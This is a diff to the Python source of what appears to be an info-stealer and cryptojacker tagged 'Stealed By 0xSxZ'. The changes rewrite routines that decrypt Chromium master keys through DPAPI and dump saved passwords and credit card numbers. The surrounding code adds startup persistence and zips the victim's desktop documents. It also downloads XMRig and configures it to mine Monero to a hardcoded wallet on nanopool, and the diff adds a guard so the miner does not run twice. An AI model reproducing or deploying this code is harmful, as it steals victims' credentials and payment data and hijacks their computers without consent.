@@ -17,6 +17,7 @@ import wmi
 import json
 import uuid
 import textwrap
+import psutil
 import glob
 import FireFoxDecrypt
 import requests
@@ -58,7 +59,7 @@ USER_NAME = getpass.getuser()
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
 chiffre = "webhook667"
-ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
+ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
 CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
@@ -193,6 +194,20 @@ if yes == "yes":
 			bat_file.write(r'start "" "%s"' % file_path)
 	if(platform.system() == 'windows' or platform.system() == "Windows"):
 		add_to_startup()
+	def checkIfProcessRunning(processName):
+		'''
+		Check if there is any running process that contains the given name processName.
+		'''
+		#Iterate over the all the running process
+		for proc in psutil.process_iter():
+			try:
+				# Check if process name contains the given name string.
+				if processName.lower() in proc.name().lower():
+					return True
+			except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+				pass
+		return False;
+	print("Running : "  + str(checkIfProcessRunning("xmrig")))
 	def stealChromeWin():
 		try:
 			res =  """Stealed By 0xSxZ ------------> \n\n"""
@@ -298,60 +313,41 @@ if yes == "yes":
 			return chrcooks
 		except Exception as e:
 			print(e)
-	def chrome_date_and_time(chrome_data):
+	def get_master_key(path):
+		with open(path, "r", encoding='utf-8') as f:
+			local_state = f.read()
+			local_state = json.loads(local_state)
+		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+		master_key = master_key[5:]  # removing DPAPI
+		master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+		return master_key
 
-		# Chrome_data format is 
-		# year-month-date hr:mins:seconds.milliseconds
-		# This will return datetime.datetime Object
-		return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
 
-	def fetching_encryption_key():
-		
-		# Local_computer_directory_path will
-		# look like this below
-		# C: => Users => <Your_Name> => AppData => 
-		# Local => Google => Chrome => User Data => 
-		# Local State
-		
-		local_computer_directory_path = os.path.join(
-		os.environ["USERPROFILE"], "AppData", "Local", "Google",
-		"Chrome", "User Data", "Local State")
-													 
-		with open(local_computer_directory_path, "r", encoding="utf-8") as f:
-			local_state_data = f.read()
-			local_state_data = json.loads(local_state_data)
+	def decrypt_payload(cipher, payload):
+		return cipher.decrypt(payload)
 
-		# decoding the encryption key using base64
-		encryption_key = base64.b64decode(
-		local_state_data["os_crypt"]["encrypted_key"])
-		
-		# remove Windows Data Protection API (DPAPI) str
-		encryption_key = encryption_key[5:]
-		
-		# return decrypted key
-		return win32crypt.CryptUnprotectData(
-		encryption_key, None, None, None, 0)[1]
-	def password_decryption(password, encryption_key):
+
+	def generate_cipher(aes_key, iv):
+		return AES.new(aes_key, AES.MODE_GCM, iv)
+
+
+	def decrypt_password(buff, master_key):
 		try:
-			iv = password[3:15]
-			password = password[15:]
-			
-			# generate cipher
-			cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
-			
-			# decrypt password
-			return cipher.decrypt(password)[:-16].decode()
-		except:
-			try:
-				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-			except:
-				return "No Passwords"
+			iv = buff[3:15]
+			payload = buff[15:]
+			cipher = generate_cipher(master_key, iv)
+			decrypted_pass = decrypt_payload(cipher, payload)
+			decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
+			return decrypted_pass
+		except Exception as e:
+			# print("Probably saved password from Chrome version older than v80\n")
+			# print(str(e))
+			return "Chrome < 80"
 	def main():
 		binks = "==============Stealed By 0xSxZ=============="
 		try:
 			for i in range(len(chromiumpaths)):
 				db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Login Data"
-				print(os.path.exists(db_path))
 				if not os.path.exists(db_path):
 					db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data" +"\\Login Data"
 					if not os.path.exists(db_path):
@@ -360,47 +356,42 @@ if yes == "yes":
 							db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
 							if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
 								continue
-				print(db_path)
-				key = fetching_encryption_key()
+				local_state_path = chromiumpaths[i]  + "\\Local State"
+				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
+					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
+					if not os.path.isfile(local_state_path):
+						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
+						if not os.path.isfile(local_state_path):
+							continue
+				master_key = get_master_key(local_state_path)
+				login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+				dbpath = str(uuid.uuid4())
+				shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
+				conn = sqlite3.connect(dbpath)
+				cursor = conn.cursor()
 
-				filename = "ChromePasswords.db"
-				shutil.copyfile(db_path, filename)
-				# connecting to the database
-				db = sqlite3.connect(filename)
-				cursor = db.cursor()
-				  
-				# 'logins' table has the data
-				cursor.execute(
-					"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
-					"order by date_last_used")
-				  
-				# iterate over all rows
-				for row in cursor.fetchall():
-					main_url = row[0]
-					login_page_url = row[1]
-					user_name = row[2]
-					decrypted_password = password_decryption(row[3], key)
-					date_of_creation = row[4]
-					last_usuage = row[5]
-					  
-					if user_name or decrypted_password:
-						binks = binks + (f"Main URL: {main_url}\n")
-						binks = binks + (f"Login URL: {login_page_url}\n")
-						binks = binks +(f"User name: {user_name}\n")
+				try:
+					cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+					for r in cursor.fetchall():
+						url = r[0]
+						username = r[1]
+						encrypted_password = r[2]
+						decrypted_password = decrypt_password(encrypted_password, master_key)
+						binks = binks + (f"Main URL: {url}\n")
+						binks = binks +(f"User name: {username}\n")
 						binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
-					  
-					else:
-						continue
-					  
-					if date_of_creation != 86400000000 and date_of_creation:
-						print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
-					  
-					if last_usuage != 86400000000 and last_usuage:
-						print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
-					print("=" * 100)
+						binks = binks + ("=" * 100)
+				except Exception as e:
+					pass
+
 				cursor.close()
-				db.close()
-				
+				conn.close()
+				try:
+					os.remove(dbpath)
+				except Exception as e:
+					pass
+
+
 				try:
 					  
 					# trying to remove the copied db file as 
@@ -552,10 +543,21 @@ if yes == "yes":
 				# not supported
 				return ""
 	def getccs():
+		binks = "==============Stealed By 0xSxZ=============="
 		try:
-			ccss = "==============Stealed by SxZ==============="
+			ccss = ("=" * 100)
 			for i in range(len(chromiumpaths)):
-				print(i)
+				db_path = str(chromiumpaths[i])+ "\\Web Data"
+				if not os.path.exists(db_path):
+					db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Web Data"
+					if not os.path.exists(db_path):
+						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Web Data" +"\\Web Data"
+						if not os.path.exists(db_path):
+							db_path = chromiumpaths[i]+ "\\Login Data"
+							if not os.path.exists(db_path):
+								db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Web Data"
+								if not os.path.exists( str(chromiumpaths[i])+ "\\Web Data"):
+									continue
 				local_state_path = chromiumpaths[i]  + "\\Local State"
 				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
 					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
@@ -563,53 +565,46 @@ if yes == "yes":
 						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
 						if not os.path.isfile(local_state_path):
 							continue
-						
-				# get the AES key
-				key = get_encryption_key(local_state_path)
-				# local sqlite Chrome database path
-				db_path = chromiumpaths[i] + "\\Web Data"
-				if not os.path.isfile(db_path):
-					db_path = chromiumpaths[i] + "\\User Data"+ "\\Web Data"
-					if not os.path.isfile(db_path):
-						db_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Web Data"
-						if not os.path.isfile(db_path):
-							db_path = chromiumpaths[i] +"\\User Data\\"+"Profile 1\\" + "\\Web Data"
-							if not os.path.isfile(db_path):
-								db_path = chromiumpaths[i] +"\\User Data\\"+"Profile 2\\" + "\\Web Data"
-								if not os.path.isfile(db_path):
-									continue
-				# copy the file to another location
-				# as the database will be locked if chrome is currently running
-				filename = "ChromeData.db"
-				shutil.copyfile(db_path, filename)
-				# connect to the database
-				db = sqlite3.connect(filename)
-				cursor = db.cursor()
-				# `logins` table has the data we need
-				cursor.execute("SELECT * FROM 'credit_cards'")
-				# iterate over all rows
-				for row in cursor.fetchall():
-					action_url = row[1]
-					username = row[2]
-					password = row[3]
-					date_created = decrypt_password(row[4], key)	
-					if username or password:
-						ccss =ccss + "\n======================================\nName on card : " + str(action_url)
+				master_key = get_master_key(local_state_path)
+				login_db = db_path
+				dbpath = str(uuid.uuid4())
+				shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
+				conn = sqlite3.connect(dbpath)
+				cursor = conn.cursor()
+				try:
+					cursor.execute("SELECT * FROM 'credit_cards'")
+					for r in cursor.fetchall():
+						action_url = r[1]
+						username = r[2]
+						password = r[3]
+						encrypted_password = r[4]
+						date_created = decrypt_password(encrypted_password, master_key)
+						print(date_created)
+						ccss =ccss + "\nName on card : " + str(action_url)
 						ccss =ccss +"\nEXP_Month : "+ str(username)
 						ccss =ccss +"\nEXP_Year: " + str(password)
 						ccss =ccss +"\nCard Num: " + str(date_created)
-					else:
-						continue
-					print("="*50)
-			cursor.close()
-			db.close()
-			try:
-				# try to remove the copied db file
-				os.remove(filename)
-			except:
-				pass
-		except Exception as e:
-			print(e)
+						ccss = ccss + ("=" * 100)
+						print(ccss)
+					cursor.close()
+					conn.close()
+				except:
+					continue
+				try:
+					os.remove(dbpath)
+				except Exception as e:
+					pass
+
+
+				try:
+					  
+					# trying to remove the copied db file as 
+					# well from local computer
+					os.remove(filename)
+				except:
+					pass
+		except ZeroDivisionError as e:
+	  		return str(e)
 		return ccss
 
 
@@ -622,8 +617,8 @@ if yes == "yes":
 		path = desktop + r'/**/*.doc'
 		files.extend(glob.glob(path, recursive=True))
 		with zipfile.ZipFile('desktop.zip', 'w') as zipF:
-		    for file in files:
-		        zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
+			for file in files:
+				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
 		os.system(XMRIGPATH)
@@ -651,7 +646,7 @@ if yes == "yes":
 				time.sleep(2)
 			except Exception as e :
 				print(str(e))
-			if MINE == True:
+			if MINE == True and checkIfProcessRunning("xmrig") == False:
 				threading.Thread(target=MineThreadLinux).start()
 				print("[.] Executing miner..")
 		else:
@@ -668,35 +663,35 @@ if yes == "yes":
 						zip_ref.extractall(os.getenv('APPDATA') + "\\winedows_companny\\update")
 					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\config.json", "x").write('''
 {
-    "coin": "monero",
-    "api": {
-        "port": 0,
-        "access-token": null,
-        "worker-id": null,
-        "ipv6": false,
-        "restricted": true
-    },
-    "background": true,
-    "colors": true,
-    "donate-level": 5,
-    "log-file": null,
-    "pools": [
-        {
-            "url": "xmr-eu1.nanopool.org:14444",
-            "user": "''' + ADDRESS + '''",
-            "pass": "x",
-            "keepalive": true,
-            "nicehash": false,
-            "variant": -1,
-            "tls": false,
-            "tls-fingerprint": null
-        }
-    ],
-    "print-time": 60,
-    "retries": 5,
-    "retry-pause": 5,
-    "syslog": false,
-    "threads": null
+	"coin": "monero",
+	"api": {
+		"port": 0,
+		"access-token": null,
+		"worker-id": null,
+		"ipv6": false,
+		"restricted": true
+	},
+	"background": true,
+	"colors": true,
+	"donate-level": 5,
+	"log-file": null,
+	"pools": [
+		{
+			"url": "xmr-eu1.nanopool.org:14444",
+			"user": "''' + ADDRESS + '''",
+			"pass": "x",
+			"keepalive": true,
+			"nicehash": false,
+			"variant": -1,
+			"tls": false,
+			"tls-fingerprint": null
+		}
+	],
+	"print-time": 60,
+	"retries": 5,
+	"retry-pause": 5,
+	"syslog": false,
+	"threads": null
 }
 
 
@@ -709,49 +704,49 @@ if yes == "yes":
 						f.write(r.content)
 					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
 	{
-	    "coin": "monero",
-	    "api": {
-	        "port": 0,
-	        "access-token": null,
-	        "worker-id": null,
-	        "ipv6": false,
-	        "restricted": true
-	    },
-	    "av": 0,
-	    "background": true,
-	    "colors": false,
-	    "cpu-affinity": null,
-	    "cpu-priority": null,
-	    "donate-level": 5,
-	    "huge-pages": true,
-	    "hw-aes": null,
-	    "log-file": null,
-	    "max-cpu-usage": ''' + MINING_PERCENT +''',
-	    "pools": [
-	        {
-	            "url": "xmr-eu1.nanopool.org:14444",
-	            "user": "''' + ADDRESS + '''",
-	            "pass": "x",
-	            "keepalive": true,
-	            "nicehash": false,
-	            "variant": -1,
-	            "tls": false,
-	            "tls-fingerprint": null
-	        }
-	    ],
-	    "print-time": 60,
-	    "retries": 5,
-	    "retry-pause": 5,
-	    "safe": false,
-	    "syslog": false,
-	    "threads": null
+		"coin": "monero",
+		"api": {
+			"port": 0,
+			"access-token": null,
+			"worker-id": null,
+			"ipv6": false,
+			"restricted": true
+		},
+		"av": 0,
+		"background": true,
+		"colors": false,
+		"cpu-affinity": null,
+		"cpu-priority": null,
+		"donate-level": 5,
+		"huge-pages": true,
+		"hw-aes": null,
+		"log-file": null,
+		"max-cpu-usage": ''' + MINING_PERCENT +''',
+		"pools": [
+			{
+				"url": "xmr-eu1.nanopool.org:14444",
+				"user": "''' + ADDRESS + '''",
+				"pass": "x",
+				"keepalive": true,
+				"nicehash": false,
+				"variant": -1,
+				"tls": false,
+				"tls-fingerprint": null
+			}
+		],
+		"print-time": 60,
+		"retries": 5,
+		"retry-pause": 5,
+		"safe": false,
+		"syslog": false,
+		"threads": null
 	}
 
 
 					''')
 			except Exception as e:
 				print(e)
-			if MINE == True:
+			if MINE == True and checkIfProcessRunning("xmrig") == False:
 				threading.Thread(target=MineThreadWin).start()
 				print("[.] Executing miner..")
 	
